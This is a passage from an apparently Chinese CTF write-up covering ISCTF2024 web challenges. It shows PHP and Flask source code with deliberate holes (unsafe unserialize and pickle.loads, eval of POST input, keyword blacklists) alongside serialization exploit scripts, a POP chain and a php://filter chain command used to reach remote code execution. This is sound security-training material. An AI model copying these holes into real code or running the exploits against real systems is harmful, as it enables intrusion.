class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;flag;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You can&#x27;t directly access the flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isAdmin</span> = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;isAdmin) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome, admin! Here&#x27;s your flag: &quot;</span> . (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>())-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello, &quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$this</span>-&gt;username) . <span class="hljs-string">&quot;!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><br>    <span class="hljs-variable">$object</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> <span class="hljs-keyword">instanceof</span> User) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$object</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Invalid object!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>反序列化触发User类中的__wakeup()魔术方法，打印出flag</p><p>序列化exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isAdmin</span> = True;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="千年樱"><a href="#千年樱" class="headerlink" title="千年樱"></a>千年樱</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;proof of work&lt;br&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;from&#x27;</span>] === <span class="hljs-string">&quot;ISCTF&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir1</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;what? so where are you from?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// &lt;!-- do you want to learn more?  goto story.txt --&gt;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>添加一个cookie</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh1.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-string">&#x27;ISCTF&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir2</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Wrong!&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>data伪协议写入</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh2.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|php|file|:|=|\/|\?/i&quot;</span>, <span class="hljs-variable">$str</span>) )&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad hacker!!!&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$poc</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;poc&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$poc</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/<span class="hljs-subst">$poc</span>/resource=/var/www/html/badChar.txt&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> === <span class="hljs-string">&quot;sakura for ISCTF&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yes! master!&quot;</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;output&#x27;</span>] == <span class="hljs-number">114514</span> &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;output&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这里用php:&#x2F;&#x2F;filter链构造字符加strips_tags截断，然后rce拿flag</p><p>用php_filter_chain_generator构造filter链</p><blockquote><p>python php_filter_chain_generator.py –chain sakura for ISCTF&lt;?php</p></blockquote><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh3.png"></p><h2 id="天命人"><a href="#天命人" class="headerlink" title="天命人"></a>天命人</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-number">1</span>.jpeg<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment"># 帮天命人搜集法宝，重获齐天之姿！</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Wuzhishan</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$wu</span>=<span class="hljs-string">&quot;俺老孙定要踏破这五指山！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zhi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shan</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$j</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$yin</span>=<span class="hljs-string">&quot;s214587387a&quot;</span>;<br>        <span class="hljs-variable">$yang</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yin</span>)==<span class="hljs-variable">$yang</span>&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yin</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yang</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;哦？又一个不信天命之人？行了，拿了东西速速离开吧&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Huoyanjinjing</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huoyan</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jinjing</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$huo</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;huoyan=<span class="hljs-string">&quot;火眼能洞察一切邪祟！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;huoyan-&gt;jinjing;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;jinjing=<span class="hljs-string">&quot;金睛能看破世间迷惘！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;huoyan-&gt;jinjing;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dinghaishenzhen</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Jindou</span>=<span class="hljs-string">&quot;一个筋斗能翻十万八千里！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yun</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$f</span>=<span class="hljs-variable language_">$this</span>-&gt;yun;<br>        <span class="hljs-variable">$f</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你真的逃出去了吗？天命人？&lt;br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jingdouyun</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Qishier</span>=<span class="hljs-number">72</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bian</span>=<span class="hljs-string">&quot;看俺老孙七十二变！&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;三更敲门，菩提老祖送我筋斗云...&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jindouyun</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tianmingren</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tianming</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ren</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;迷途中的羔羊，你相信天命吗？&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;tianming;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Wukong&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;开局一根棍，装备全靠打。&#x27;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>序列化poc</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">Tianmingren<span class="hljs-punctuation">#</span><span class="hljs-keyword">__destruct</span><span class="hljs-params">()</span>==&gt;Dinghaishenzhen<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;Huoyanjinjing<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;Wuzhishan<span class="hljs-punctuation">#</span><span class="hljs-keyword">__get</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>序列化exp</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs leaf">&lt;?php<br><br>class Tianmingren &#123;<br>    public $tianming;<br>&#125;<br><br>class Dinghaishenzhen &#123;<br>    public $yun;<br>&#125;<br><br>class Huoyanjinjing &#123;<br>    public $huoyan;<br>&#125;<br><br>class Wuzhishan&#123;<br>    <br>&#125;<br><br>$a = new Tianmingren();<br>$a-&gt;tianming = new Dinghaishenzhen();<br>$a-&gt;tianming-&gt;yun = new Huoyanjinjing();<br>$a-&gt;tianming-&gt;yun-&gt;huoyan = new Wuzhishan();<br><br>echo serialize($a);<br><br>// Tianmingren<span class="hljs-punctuation">#</span><span class="hljs-keyword">__destruct</span><span class="hljs-params">()</span>==&gt;Dinghaishenzhen<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;Huoyanjinjing<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;Wuzhishan<span class="hljs-punctuation">#</span><span class="hljs-keyword">__get</span><span class="hljs-params">()</span><br><br>?&gt;<br></code></pre></td></tr></table></figure><p>绕过__get()方法中的判断只要找一个0e开头的字符串且其md5值仍为0e开头即可</p><p>源码中的“throw new Exception(‘开局一根棍，装备全靠打。’);”会抛出一个异常，直接中断脚本执行，去破坏反序列化结构，这里通过将下图中选中出的0修改为2，达到破坏反序列化结构的目的</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/tianming.png"></p><h2 id="新闻系统"><a href="#新闻系统" class="headerlink" title="新闻系统"></a>新闻系统</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;W3l1com_isCTF&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">News</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, title, content</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.title = title<br>        <span class="hljs-variable language_">self</span>.content = content<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;news(name=<span class="hljs-subst">&#123;self.title&#125;</span>, words=<span class="hljs-subst">&#123;self.content&#125;</span>)&quot;</span><br>    <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NewsList</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.news_list = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_news</span>(<span class="hljs-params">self, title, content</span>) -&gt; <span class="hljs-literal">None</span>:<br>        news = News(title,content)<br>        <span class="hljs-variable language_">self</span>.news_list.append(news)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">export_news</span>(<span class="hljs-params">self, news_title</span>) -&gt; <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span>:<br>        news = <span class="hljs-variable language_">self</span>.get_news(news_title)<br>        <span class="hljs-keyword">if</span> news <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-variable language_">self</span>.news_list.remove(news)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;删除成功&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_news</span>(<span class="hljs-params">self, serialized_news</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">try</span>:<br>            news_data = base64.b64decode(serialized_news)<br>            black_list = [<span class="hljs-string">&#x27;create_news&#x27;</span>,<span class="hljs-string">&#x27;export_news&#x27;</span>,<span class="hljs-string">&#x27;add_news&#x27;</span>,<span class="hljs-string">&#x27;get_news&#x27;</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> black_list:<br>                <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(news_data):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            news = pickle.loads(news_data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(news,News):<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.news_list:<br>                    <span class="hljs-keyword">if</span> i.title == news.title:<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>                <span class="hljs-variable language_">self</span>.news_list.append(news)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_news</span>(<span class="hljs-params">self, news_title</span>) -&gt; News | <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">for</span> news <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.news_list:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(news.title) == news_title:<br>                <span class="hljs-keyword">return</span> news<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br>newslist = NewsList()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">and</span> password == <span class="hljs-string">&#x27;test111&#x27;</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>            session[<span class="hljs-string">&#x27;password&#x27;</span>] = password<br>            session[<span class="hljs-string">&#x27;status&#x27;</span>] = <span class="hljs-string">&#x27;user&#x27;</span><br>            <span class="hljs-keyword">return</span> redirect(<span 